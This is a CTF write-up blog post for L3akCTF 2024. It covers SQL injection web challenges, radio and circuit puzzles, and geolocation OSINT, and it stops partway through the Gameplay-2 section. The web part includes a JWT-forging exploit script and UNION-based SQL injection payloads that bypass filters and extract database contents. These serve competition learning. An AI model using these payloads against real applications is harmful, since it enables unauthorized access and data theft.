---
title: "CTF - L3akCTF 2024"
categories: [ctf]
date: 2024-05-19
comments: true
description: L3akCTF 2024 Writeups
image: /images/kashmir.png
favicon: /images/favicon.ico
description: CTF - L3akCTF 2024
---

# L3akCTF 2024

Welcome to another CTF writeup. I did some CTFs early this year but didn't publish writeups, but here we are, back again. This time I played L3akCTF 2024 in the weekend time. We participated as [ISwearGoogledIt](https://ctftime.org/team/109689) with [Razvi](https://razvioverflow.github.io/) and [Bubu](https://albertofdr.github.io/). We got on top 20! 🔥 Let's get started:

<br>

<p align="center">
  <img src="/images/writeups/L3akCTF2024/banner.png" width="60%"/>
</p>


### Web
- [PEPE - [48 solves]](#pepe---48-solves)
- [bbsqli - [43 solves]](#bbsqli---43-solves)


### Hardware
- [Layout - [90 solves]](#layout---90-solves)
- [Celestial - [28 solves]](#celestial---28-solves)
- [Communication Gateway - [9 solves]](#communication-gateway---9-solves)
- [eXORbitant - [12 solves]](#exorbitant---12-solves)


### OSINT
- [Geosint-1 - [229 solves]](#geosint-1---229-solves)
- [Geosint-2 - [164 solves]](#geosint-2---164-solves)
- [Geosint-3 - [129 solves]](#geosint-3---129-solves)
- [Geosint-4 - [84 solves]](#geosint-4---84-solves)
- [Gameplay-1 - [149 solves]](#gameplay-1---149-solves)
- [Gameplay-2 - [65 solves]](#gameplay-2---65-solves)
- [Gameplay-3 - [34 solves]](#gameplay-3---34-solves)
- [Gameplay-4 - [22 solves]](#gameplay-4---22-solves)


### Forensic
- [HoldOnTight - [68 solves]](#holdontight---68-solves)


<small><i><a href="https://github.com/kashmir54/md-toc">Table of contents generated with md-toc</a></i></small>

---

<br>

# Web

## PEPE - [48 solves]
492
web
Can you bypass my filters ?

_Authors: S1mple & Achux21_

http://45.129.40.107:9669/

We have a login-register-dashboard app:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/web_2.png" width="70%"/>
</p>

And the following app.py code:

```python
#!/usr/bin/env python3 
from flask import Flask, render_template, request, make_response, redirect
import sqlite3, jwt, datetime, os

app = Flask(__name__, template_folder='./static')

secret = os.environ.get('SECRET', 'secret')

flag = os.environ.get('FLAG', 'L3AK{this_is_a_fake_flag}')

conn = sqlite3.connect("challenge.db")
cursor = conn.cursor()

cursor.execute("CREATE TABLE IF NOT EXISTS users (username TEXT NOT NULL, password TEXT NOT NULL, fortune TEXT NOT NULL);")

cursor.execute("CREATE TABLE IF NOT EXISTS flag (flag TEXT);")

if not cursor.execute("SELECT * FROM flag;").fetchone():
    cursor.execute(f"INSERT INTO flag (flag) VALUES ('{flag}');")

conn.commit()
conn.close()

def create_jwt(username, password, alg):
    payload ={
        'username': username,
        'password': password,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(seconds=6000)
    }
    token = jwt.encode(payload, secret, algorithm=alg)
    return token

def verify_jwt(token, alg):
    try:
        payload = jwt.decode(token, secret, algorithms=alg)
        return payload.get('username')
    except jwt.ExpiredSignatureError:
        return 'Token expired'
    except jwt.InvalidTokenError:
        return 'Invalid token'


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.form.get('username') and request.form.get('password'):
        username = request.form.get('username')
        password = request.form.get('password')

        if not username.isalnum():
            return render_template('signup.html', error='Username can only contain alphanumeric characters')

        if len(username) < 3:
            return render_template('login.html', error='Username must be at least 3 characters long')
        if len(username) > 20:
            return render_template('login.html', error='Username must be at most 20 characters long')
        if len(password) < 8:
            return render_template('login.html', error='Password must be at least 8 characters long')
        if not username.isalnum():
            return render_template('login.html', error='Username can only contain alphanumeric characters')

        fortune = os.popen('fortune').read()
        conn = sqlite3.connect("challenge.db")
        cursor = conn.cursor()
        query = "SELECT * FROM users WHERE username = ?;"
        cursor.execute(query, (username,))
        if cursor.fetchone():
            return render_template('signup.html', error='User already exists')

        query = "INSERT INTO users (username, password, fortune) VALUES (?, ?, ?);"
        
        cursor.execute(query, (username, password, fortune))
        conn.commit()
        conn.close()
        return render_template('login.html', error='User created successfully')
    else:
        return render_template('signup.html', error='Please provide username and password')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.form.get('username') and request.form.get('password') and request.method == 'POST':    
        
        username = request.form.get('username')
        password = request.form.get('password')
        if len(username) < 3:
            return render_template('login.html', error='Username must be at least 3 characters long')
        if len(username) > 20:
            return render_template('login.html', error='Username must be at most 20 characters long')
        if len(password) < 8:
            return render_template('login.html', error='Password must be at least 8 characters long')
        if not username.isalnum():
            return render_template('login.html', error='Username can only contain alphanumeric characters')


        conn = sqlite3.connect("challenge.db")
        cursor = conn.cursor()
        query = "SELECT * FROM users WHERE username = ? AND password = ?;"
        cursor.execute(query, (username, password))
        if not cursor.fetchone():
            return render_template('login.html', error='Invalid username or password')  
        conn.close()
        
        token = create_jwt(username, password, 'HS256')
        r = make_response(redirect('/dashboard'))
        r.set_cookie('token', token)
        return r
    
    else:
        return render_template('login.html', error='Please provide username and password')

@app.route('/dashboard')
def dashboard():
    
    token = request.cookies.get('token')
    if not token:
        return render_template('login.html', error='Please login to access this page')
    # my code
    decoded_token = jwt.decode(token, secret, algorithms=['HS256'])
    
    username = decoded_token.get('username')
    username=username.lower()
    filters=[">", "+","=", "<","//", "|","'1", " 1", " true", "'true", " or", "'or", "/or",";", " ", " " ," and", "'and", "/and", "'like", " like", "%00", "null", "admin'","/like", "'where", " where", "/where"]
    passed = next(
            (
                i
                for i in filters
                if i in username
            ),
            None,
        )

    if passed:
        return render_template('login.html', error='Invalid username or password')

    if not token:
        return redirect('/login')
    username = verify_jwt(token, 'HS256')
    if username:
        conn = sqlite3.connect("challenge.db")
        cursor = conn.cursor()
        query = f"SELECT fortune FROM users WHERE username='{username}';"
        result = cursor.execute(query)
        row = result.fetchone()
        if row:
            query = row[0].replace("\\n", "\n").replace("('", "").replace("',)", "")
            conn.close()
            return render_template('dashboard.html', fortunes=query)
        else:
            conn.close()
            return render_template('login.html', error='Invalid username or password')
    else:
        return redirect('/login')

@app.route('/logout')
def logout():
    r = make_response(redirect('/login'))
    r.set_cookie('token', '', expires=0)
    return r

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

```
<br>

We can highlight the following parts as relevant for the challenge:

```python

# The flag is at the DB, so we will need an SQL injection
cursor.execute("CREATE TABLE IF NOT EXISTS flag (flag TEXT);")

if not cursor.execute("SELECT * FROM flag;").fetchone():
    cursor.execute(f"INSERT INTO flag (flag) VALUES ('{flag}');")


############## SNIP #################


@app.route('/dashboard')
def dashboard():
    
    token = request.cookies.get('token')
    if not token:
        return render_template('login.html', error='Please login to access this page')
    # my code
    decoded_token = jwt.decode(token, secret, algorithms=['HS256'])
    
    # Filters we have to bypass on the USERNAME SQL injection point down below
    # The username is taken from the token 😳
    username = decoded_token.get('username')
    username=username.lower()
    filters=[">", "+","=", "<","//", "|","'1", " 1", " true", "'true", " or", "'or", "/or",";", " ", " " ," and", "'and", "/and", "'like", " like", "%00", "null", "admin'","/like", "'where", " where", "/where"]
    passed = next(
            (
                i
                for i in filters
                if i in username
            ),
            None,
        )

    if passed:
        return render_template('login.html', error='Invalid username or password')

    if not token:
        return redirect('/login')
    username = verify_jwt(token, 'HS256')
    if username:
        conn = sqlite3.connect("challenge.db")
        cursor = conn.cursor()

        # The injection point, we have to inject in the USERNAME and bypass aforementioned filter
        query = f"SELECT fortune FROM users WHERE username='{username}';"
        result = cursor.execute(query)
        row = result.fetchone()
        if row:
            query = row[0].replace("\\n", "\n").replace("('", "").replace("',)", "")
            conn.close()
            return render_template('dashboard.html', fortunes=query)


####################### SNIP ################

# The registration part, we need to inject in the USERNAME, but we have the following restrictions:
@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.form.get('username') and request.form.get('password'):
        username = request.form.get('username')
        password = request.form.get('password')

        if not username.isalnum():
            return render_template('signup.html', error='Username can only contain alphanumeric characters')

        if len(username) < 3:
            return render_template('login.html', error='Username must be at least 3 characters long')
        if len(username) > 20:
            return render_template('login.html', error='Username must be at most 20 characters long')
        if len(password) < 8:
            return render_template('login.html', error='Password must be at least 8 characters long')
        if not username.isalnum():
            return render_template('login.html', error='Username can only contain alphanumeric characters')

        fortune = os.popen('fortune').read()
        conn = sqlite3.connect("challenge.db")
        cursor = conn.cursor()
        query = "SELECT * FROM users WHERE username = ?;"
        cursor.execute(query, (username,))
        if cursor.fetchone():
            return render_template('signup.html', error='User already exists')

        query = "INSERT INTO users (username, password, fortune) VALUES (?, ?, ?);"
        
        cursor.execute(query, (username, password, fortune))
        conn.commit()
        conn.close()
        return render_template('login.html', error='User created successfully')

```

Mainly, we have two filters for our SQLi payloads:

- At the registration:

```python
username.isalnum()
len(username) < 3
len(username) > 20
```

- At dashboard (from the JWT token username):

```python
filters=[">", "+","=", "<","//", "|","'1", " 1", 
  " true", "'true", " or", "'or", "/or",";", " ", 
  " " ," and", "'and", "/and", "'like", " like", 
  "%00", "null", "admin'","/like", "'where", 
  " where", "/where"]
```

[Bubu](https://albertofdr.github.io/) said that we might try to bruteforce the JWT secret to bypass registration filters and while I thought that the secret might be really hard, but to be honest, there was no chance to get an SQL injection with the _username.isalnum()_ filter. He tried and the secret was "secret" as the default value in the code 😨 (I expect some 32 hexadecimal secret or something):

```python
secret = os.environ.get('SECRET', 'secret')
```

[Bubu](https://albertofdr.github.io/) prepared the exploit script while I was crafting the SQLi payload:

```python
import jwt
import sys
import requests

URL = "http://45.129.40.107:9669/"
SESSION = requests.Session()

def create_user(PAYLOAD):
    params = {
        "username": PAYLOAD,
        "password": "asdasdasdasdasd"
            }
    r = SESSION.post(URL+'signup', params)
    print(r.status_code)

def login(PAYLOAD):
    params = {
        "username": PAYLOAD,
        "password": "asdasdasdasdasd"
            }
    r = SESSION.post(URL+'login', params)
    print(r.status_code)


def exploit(payload):
    cookie = {
        "token": jwt.encode({'username': payload,'password' : 'contraseÃ±a'}, 'secret', algorithm='HS256')
            }
    r = requests.get(URL+'dashboard', cookies=cookie)
    print(r.text)

PAYLOAD = "bubu"
exploit(sys.argv[1])

# Launch exploit
# python3 script.py "'union/**/select/**/flag/**/from/**/flag--"
```

Executing the script, it will print the dashboard HTML with the flag:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/web_3.png" width="70%"/>
</p>

``` L3AK{5q1_1nj3ct10n_CLF} ```


<br>

## bbsqli - [43 solves]
477
web
SO Classic !

_Author: xhalyl_

http://45.129.40.107:9676/


We have the following code:

```python
from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
import hashlib
import os
from utils import generate,hash_password

app = Flask(__name__)
app.secret_key = generate(60)


FLAG = os.getenv('FLAG')

def init_db():
    conn = sqlite3.connect('l3ak.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            email TEXT NOT NULL,
            password TEXT NOT NULL
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS flags (
            id INTEGER PRIMARY KEY,
            flag TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

def add_flag(flag):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('INSERT INTO flags (flag) VALUES (?)', (flag,))
    conn.commit()
    conn.close()


def add_user(username,email, password):
    conn = get_db_connection()
    cursor = conn.cursor()

    hashed_password = hash_password(password)
    print(f"Adding user {username} with pass {password} hashed {hashed_password}")
    cursor.execute('INSERT INTO users (username,email, password) VALUES (?,?, ?)', (username,email, hashed_password))
    conn.commit()
    conn.close()

init_db()

def get_db_connection():
    conn = sqlite3.connect('l3ak.db')
    conn.row_factory = sqlite3.Row
    return conn


r = generate(30)
print(r)
print(hash_password(r))
add_user("admin","l3aker@l3ak.com",hash_password(r))
add_flag(FLAG)


@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
       try: 
        username = request.form['username']
        password = request.form['password']
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(f'SELECT username,email,password FROM users WHERE username ="{username}"')
        user = cursor.fetchone()
        conn.close()
        if user and user['username'] == username and user['password'] == hash_password(password):
            session['username'] = user['username']
            session['email'] = user['email']
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error='Invalid username or password')
       except:
           return render_template('login.html', error='Invalid username or password')
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        email = request.form['email']
        password = request.form['password']
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT username FROM users WHERE username = ?', (username,))
        existing_user = cursor.fetchone()
        if existing_user:
            return render_template('register.html', error='Username already exists')
        add_user(username, email, password)
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/dashboard')
def dashboard():
    if 'username' in session:
        username = session['username']
        email = session['email']
        return render_template('dashboard.html', user=username,email=email)
    return redirect(url_for('login'))

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run()

```

The name of the challenge aims for SQL injection, the relevant parts of the code are (check the code for comments I did):

```python

# The flag is on the DB:
FLAG = os.getenv('FLAG')

def init_db():
    conn = sqlite3.connect('l3ak.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            email TEXT NOT NULL,
            password TEXT NOT NULL
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS flags (
            id INTEGER PRIMARY KEY,
            flag TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

########### SNIP

# On the registration there is no injection on the username
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        email = request.form['email']
        password = request.form['password']
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT username FROM users WHERE username = ?', (username,))
        existing_user = cursor.fetchone()
        if existing_user:
            return render_template('register.html', error='Username already exists')
        add_user(username, email, password)
        return redirect(url_for('login'))
    return render_template('register.html')

############# SNIP

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
       try: 
        username = request.form['username']
        password = request.form['password']
        conn = get_db_connection()
        cursor = conn.cursor()
        # Here we have the injection point for SQL
        cursor.execute(f'SELECT username,email,password FROM users WHERE username ="{username}"')
        user = cursor.fetchone()
        conn.close()
        if user and user['username'] == username and user['password'] == hash_password(password):
            session['username'] = user['username']
            # Here, there email is taken from the query to the session
            session['email'] = user['email']
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error='Invalid username or password')
       except:
           return render_template('login.html', error='Invalid username or password')
    return render_template('login.html')

############ SNIP

@app.route('/dashboard')
def dashboard():
    if 'username' in session:
        username = session['username']
        # The email is taken from the DB, to the session and then rendered to the template
        email = session['email']
        return render_template('dashboard.html', user=username,email=email)
    return redirect(url_for('login'))
```

On the username we can go for a blind boolean injection, but no brute-force is allowed. The idea as spoiled in the code, is to make a [union SQL injection](https://portswigger.net/web-security/sql-injection/union-attacks) and return the **flag** on the query on the **email** position so it gets loaded into the session and rendered in the HTML. The issue is the following check after the injection. The code checks if username from the POST request payload is equal to the username taken from the DB, and that is not possible with only one payload (if I think it twice, I believe it's possible with the wildcards). Let's break it down:

Imagine we have the following payload:

```bash
username=wee"+union+select+"wee",flag,"wee"+from+flags--&password=wee         
```
The username from the POST will be:
_**_wee"+union+select+"wee",flag,"wee"+from+flags--_

The username from the SQL Query with the injection is:
_wee_

That is not equal, but if we try to rebuild the username in the DB, we get into an infinite loop, since we have to insert the payload within the payload, i.e. P != P+P. So the solution is to use the wildcard on the DB, using for example _LIKE "wee%"_. We use INNER JOIN to take the **username** and the **password** from **users** table and the **flag** from the **flags** table:

We send the following payload on register. We have to use the hash of the dummy password "ttt" since the code does not work as expected, I suppose:

```sql
# Register
## Payload
username=ittt"+union+select+username,flag,"9990775155c3518a0d7917f7780b24aa"+from+users+inner+join+flags+on+username+like+"ittt%"--&email=wee%40wee.com&password=ttt
```

And on the login endpoint we send the following payload:

```sql
# Login
## Target query
SELECT username,email,password FROM users WHERE username ="ittt" UNION 
  SELECT username,flag,"9990775155c3518a0d7917f7780b24aa" FROM USERS 
  INNER JOIN flags on USERNAME LIKE "ittt%"
## Payload
username=ittt"+union+select+username,flag,"9990775155c3518a0d7917f7780b24aa"+from+users+inner+join+flags+on+username+like+"ittt%"--&password=ttt
```
Register the auxiliary username. The user is stored as it is since it is a query statement and quotes are escaped:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/2_3_register.png" width="70%"/>
</p>

Make the login with the username injection and retrieve the flag in the email field on the session:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/2_4_redirect.png" width="70%"/>
</p>

Once logged in, the flag is in the email:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/2_5_flag.png" width="70%"/>
</p>

Maybe, I overcomplicated the challenge, but yeah, that's me!

``` L3ak{__V3RY_B4S1C_SQLI} ```

<br>

---

<br>

# Hardware

## Layout - [90 solves]
477
baby hardware
I was drawing some metal layers for my integrated circuit layout, when I noticed some of them looked a little weird...

_Author: Suvoni_

We have a layout.GDS so I used a [Layout Editor](https://layouteditor.com/) to load the file and we have the flag inside:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/hw_1.png" width="70%"/>
</p>


``` L3AK{w3LcoM3_To_HArDw4R3!} ```

<br>


## Celestial - [28 solves]
496
radio
We've received this file over the cosmic network at our headquarters. No idea what they tried to tell us, can you help ?

_Author: 0x157_

We have the following audio file:

<div align="center">
  <audio controls>
    <source src="/images/writeups/L3akCTF2024/attachment.wav" type="audio/wav">
  Your browser does not support the audio element.
  </audio>
</div>

From experience, this sounds like [SSTV](https://en.wikipedia.org/wiki/Slow-scan_television). If you don't know what is it, check it out because it is outstanding old technology.

I used [RX-SSTV](https://www.qsl.net/on6mu/rxsstv.htm) and since I'm lazy, I placed the microphone next to the speaker and render the image:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/hw_2.png" width="60%"/>
</p>

``` L3AK{SsTV_k1nd4_c00l!} ```



## Communication Gateway - [9 solves]
498
radio
Something is in-front of you, and you don't even know it.

_Author: 0x157_

We have the following attachment audio file:

<div align="center">
  <audio controls>
    <source src="/images/writeups/L3akCTF2024/file10.wav" type="audio/wav">
  Your browser does not support the audio element.
  </audio>
</div>

Again from experience, the sound is modem tones. We can use [minimodem](http://www.whence.com/minimodem/) to decode it, but we need to set the baudmode. I took a guess over the filename and it worked, I tried Bell-like with 10_N baudmode:

```bash
minimodem -h                
minimodem: invalid option -- 'h'
usage: minimodem [--tx|--rx] [options] {baudmode}
                    -t, --tx, --transmit, --write
                    -r, --rx, --receive,  --read     (default)
                [options]

            {baudmode}
        any_number_N       Bell-like      N bps --ascii
                1200       Bell202     1200 bps --ascii
                 300       Bell103      300 bps --ascii
                rtty       RTTY       45.45 bps --baudot --stopbits=1.5
                 tdd       TTY/TDD    45.45 bps --baudot --stopbits=2.0
                same       NOAA SAME 520.83 bps --sync-byte=0xAB ...
            callerid       Bell202 CID 1200 bps
 uic{-train,-ground}       UIC-751-3 Train/Ground 600 bps

# Solution

minimodem -f file10.wav 10_N  
### CARRIER 10.00 @ 1590.0 Hz ###
L3AK{s1gn4ls_0f_h0p3}

### NOCARRIER ndata=22 confidence=33.694 ampl=0.636 bps=10.00 (rate perfect) ###
```

``` L3AK{s1gn4ls_0f_h0p3} ```

<br>

## eXORbitant - [12 solves]
495
hardware
What is this circuit doing to the flag?

_Author: Suvoni_

We have the following XOR circuit provided in the attachment ZIP file. We can open the file with [Logisim](http://www.cburch.com/logisim/):

<p align="center">
  <img src="/images/writeups/L3akCTF2024/hw_33.png" width="70%"/>
</p>

On the challenge attachments, we can see the RAM output from the circuit:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/hw_333.png" width="70%"/>
</p>

I created the following bruteforce script, following the XOR gates schema and setting the input lanes on the different gates. The idea is to bruteforce the input so we get the RAM output:

```python
import time
import itertools
from tqdm import tqdm

# Create the bruteforce inputs, 16 bit length 0000000000000000 - 1111111111111111
ls = list(itertools.product([0, 1], repeat=16))
lst = []
for l in ls:
  lst.append(''.join(map(str, l)))

# Gates inputs. Ie. gate 5 has inputs: 11,10,7,2
gates = {
  "15": [15,13,10,9,7,6,5,2,1],
  "14": [15,14,9,3,2,1],
  "13": [14,13,12,11,10,9,7,5,4,3,1],
  "12": [15,14,13,12,11,8,6,5,4,3],
  "11": [12,11,10,6,5,2,1],
  "10": [15,11,9,6,3,0],
  "9": [14,10,9,8,7,5,4,1,0],
  "8": [11,10,9,8,7,6,4,2,0],
  "7": [15,14,12,11,9,8,7,6,5,4,2,0],
  "6": [15,13,12,10,9,8,6,5,1,0],
  "5": [11,10,7,2],
  "4": [14,7,6,3],
  "3": [15,14,13,12,11,10,9,8,5,4,3,0],
  "2": [15,13,7,5,3,2,1,0],
  "1": [15,14,11,9,7,6,5,4,1,0],
  "0": [14,13,12,11,9,7,5,4,3,2]
}

gate_status = {}

for i in range(0,16):
  gate_status[str(i)] = 0

# The challenge provide us with the following cypher codes:
cipher = ["8094","6514","e9f3","cc9b","a618","f075","eae8","30db","899f","6c8d","4bf2","34eb","30db","b53a","c777","0d65"]
finals = []

# Method to test if the if the input generates the cipher_bin
def test_gates(trying, cipher_bin):

  for g in gates:
    pos = 15
    gate = 0
    for i in trying:
      if int(i) == 1 and pos in gates[g]:
        gate+=1
      pos-=1

    if gate % 2:
      gate_status[g] = 1
    else:
      gate_status[g] = 0


    if str(cipher_bin[15-int(g)]) != str(gate_status[g]):
      return False

  return True

h = ""
# Go for each input and bruteforce it
for c in cipher:
  cipher_bin = bin(int(c, 16))[2:].zfill(16)

  # Try all inputs
  for trying in lst:
    if test_gates(trying, cipher_bin):
      l_t = list(trying)
      ma_g = hex(int("".join(l_t), 2))
      finals.append(ma_g)

  h = ''.join(finals)

  # From hex to ASCII
  print(bytearray.fromhex(h.replace("0x", "")).decode())

```

And we get the flag:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/hw_3.png" width="60%"/>
</p>

``` L3AK{X0R_1s_EaS1lY_R3vErS1BLe!!} ```


<br>

---

<br>

# OSINT


## Geosint-1 - [229 solves]
205
Submit the flag for the corresponding challenge (chall1) here.

The geosint platform can be found at: [https://osint.buzz/](https://osint.buzz/)

_Authors: 0x157 & Suvoni_

For this challenge we land at a road with some sky scrapers at the end of it. With a river next to them, I started to think about New York 🇺🇸. Looking at the other side, we found a bridge. 

<p align="center">
  <img src="/images/writeups/L3akCTF2024/1_00_osint.png" width="70%"/>
</p>

<p align="center">
  <img src="/images/writeups/L3akCTF2024/1_0_osint.png" width="70%"/>
</p>


Using [Google Lens](https://lens.google/) with the bringe on the frame, we find its name, confirming the New York hipothesis, so we just need to follow the road alongside the river and find the exact location:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/1_1_lens.png" width="70%"/>
</p>

<p align="center">
  <img src="/images/writeups/L3akCTF2024/1_1_flag.png" width="70%"/>
</p>

[Google Maps exact location](https://www.google.es/maps/@40.6339557,-74.0388724,3a,75y,17.8h,85.17t/data=!3m6!1e1!3m4!1saNApxfW9xFykH8SOvtzyAA!2e0!7i16384!8i8192?hl=es&entry=ttu)


``` L3AK{Verr4zz4n0_Br1dge_1s_pR3tty_c00l} ```

<br>

## Geosint-2 - [164 solves]
354
Submit the flag for the corresponding challenge (chall2) here.

The geosint platform can be found at: https://osint.buzz/

_Authors: 0x157 & Suvoni_

Looking at this position, we find different clues, first the cyrillic alphabet, then the ambulance number 103. A quick lookup will reduce the search to the [countries with ambulance number 103](https://en.wikipedia.org/wiki/List_of_emergency_telephone_numbers): 🇰🇿 Kazakhstan, 🇲🇳 Mongolia, 🇹🇯 Tajikistan and 🇹🇲 Turkmenistan.

<p align="center">
  <img src="/images/writeups/L3akCTF2024/2_0_ini.png" width="70%"/>
</p>


<p align="center">
  <img src="/images/writeups/L3akCTF2024/2_1_ini.png" width="70%"/>
</p>

The most obvious clue was the Doner City restaurant. [RazviOverflow](https://razvioverflow.github.io/) searched on Google Lens for the store and found the [following result](https://2gis.kz/karaganda/firm/70000001029160469?m=73.19371%2C49.864088%2F11.95):

<p align="center">
  <img src="/images/writeups/L3akCTF2024/2_2_lens.png" width="70%"/>
</p>

<p align="center">
  <img src="/images/writeups/L3akCTF2024/2_3_place.png" width="70%"/>
</p>

We have now the [exact Google Maps location](https://www.google.es/maps/@49.8935726,73.2109379,3a,75y,106.2h,90.66t/data=!3m6!1e1!3m4!1sMwRp8u5JXHgheMOOIONnsQ!2e0!7i16384!8i8192?hl=es&entry=ttu), so look at the map at the platform and submit to get the flag:

``` L3AK{@_Cr0SsR04Ds_1N_kaZAKh5t4N} ```

<br>


## Geosint-3 - [129 solves]
460
The geosint platform can be found at: https://osint.buzz/

Submit the flag for the corresponding challenge (chall3) here.

_Authors: 0x157 & Suvoni_

In this challenge we land at an empty road, with the white sign and a light post number. The flag aims for the light post as the foothold for the challenge, but I took other ways to solve this one:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/3_0_ini.png" width="70%"/>
</p>

<p align="center">
  <img src="/images/writeups/L3akCTF2024/3_1_ini.png" width="70%"/>
</p>

We see some chinese letters on the white sign with red characters, and since Google Maps is not common on China, I took a guess into 🇹🇼 Taiwan. Looking to the numbers in the sign on Google, we find a company with those phone numbers:

(037)720668
(037)722033

<p align="center">
  <img src="/images/writeups/L3akCTF2024/3_2_google.png" width="70%"/>
</p>

The [website](https://www.twfile.com/item.aspx?no=42584738&sn=2030338) shows the location (use it's chinise format 苗栗縣後龍鎮龍坑里17 for better results):

<p align="center">
  <img src="/images/writeups/L3akCTF2024/3_3_location.png" width="70%"/>
</p>

Looking for 苗栗縣後龍鎮龍坑里17 on Maps, we got the following result, and in the same road, we can find that [exact Google Maps location](https://www.google.es/maps/@24.5890227,120.7725047,3a,75y,356.19h,86.36t/data=!3m6!1e1!3m4!1sw0_ea0-KcicUahk5oO7A_w!2e0!7i16384!8i8192?hl=es&entry=ttu):

<p align="center">
  <img src="/images/writeups/L3akCTF2024/3_4_res.png" width="70%"/>
</p>


``` L3AK{P0L3_NumB3R_7012} ```


<br>


## Geosint-4 - [84 solves]
494
The geosint platform can be found at: https://osint.buzz/

Submit the flag for the corresponding challenge (chall4) here.

_Authors: 0x157 & Suvoni_

In this challenge, we have so little information. Still, on our team, we are familiar with this landscape and we can affirm that it was the Mediterranean Sea as soon as we see the images:


<p align="center">
  <img src="/images/writeups/L3akCTF2024/4_0_ini.png" width="70%"/>
</p>

<p align="center">
  <img src="/images/writeups/L3akCTF2024/4_1_ini.png" width="70%"/>
</p>

<p align="center">
  <img src="/images/writeups/L3akCTF2024/4_2_ini.png" width="70%"/>
</p>

We have some clues, first, [the white over black arrow sign](https://www.reddit.com/r/geoguessr/comments/lwa9wr/map_of_european_road_curve_chevron_signs/), which closes the search to Spain, Italy, Malta and Greece (what we expected). Then, it is a road close to the sea, close to a city and the most important clue is the **4 lanes witdh with no separation between the traffic flow**. These 4 lanes roads with no separation are uncommon (at least on Spain and the Mediterranean tour me and my teammates did on GMaps).

<p align="center">
  <img src="/images/writeups/L3akCTF2024/4_2_sign.png" width="50%"/>
</p>

We when all over Greece, Sicilia and Sardegna looking for 4 way lanes with same landscape a couple islands nearby and after some time, [RazviOverflow](https://razvioverflow.github.io/) landed in the [exact Google Maps point](https://www.google.com/maps/@37.8083926,23.8006507,3a,75y,200.47h,86.15t/data=!3m6!1e1!3m4!1sOrHV34a389gUi6cPdXhD3w!2e0!7i16384!8i8192!5m1!1e2?entry=ttu) where the image was taken:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/4_3_map.png" width="70%"/>
</p>


``` L3AK{GrEeCe_R0@DTr1P!} ```

Here you have some interesting resources I discovered along the way:

- [Lincense plates](http://www.worldlicenseplates.com/)
- [Google Car fingerprint](https://geohints.com/Cars)

<br>

## Gameplay-1 - [149 solves]
50
When me and my friend aren't duoing CTFs, we like to play video games together. We left a trail of flags in the wake of our gaming antics, can you find them all? Here's a clue to start you off: mch4cker1337

_Authors: Suvoni & 0x157_

A quick search at Google, we will discover his friend's YouTube channel, [Marini Craft](https://www.youtube.com/channel/UC-S_6ytFczS7dkjHTVM5v8A). He has a video of a Pro Minecraft GamePlay with the target **mch4cker1337** and it has description "Flag1". Taking a closer look to the video, we can see that user **mch4cker1337** types characters at the chat during the gameplay. Take it easy and extract all characters from the gameplay in time order:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_0.png" width="70%"/>
</p>


``` L3AK{M1n3Cr4ft_G4m3Pl4y_1th_M4rt1n!_Cr4Ft_1s_v3Ry_fun} ```

<br>

## Gameplay-2 - [65 solves]
316
It's recommended to solve Gameplay-1 before you can solve this challenge.

_Authors: Suvoni & 0x157_

Going deep on the search, there is a comment from the target **mch4cker1337** on the video with his [Reddit account](https://www.reddit.com/user/Feisty-Schedule1097/).

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_2_comment.png" width="70%"/>
</p>


- Youtube: https://www.youtube.com/@mch4cker1337
- Reddit: https://www.reddit.com/user/Feisty-Schedule1097/

On his reddit, we can see many deleted comments. On [wayback machine](https://web.archive.org/) there is no clue, so we tried [old.reddit.com](https://old.reddit.com/user/Feisty-Schedule1097/) and found a discord server link:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_2_rem.png" width="70%"/>
</p>

Deleted posts were still on old.reddit.com:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_2_dis.png" width="70%"/>
</p>

On the discord server we found the flag on the channel description:

<p align="center">
  <img src="/images/writeups/L3akCTF2024/gameplay_2_flag.png" width="70%"/>
</p>

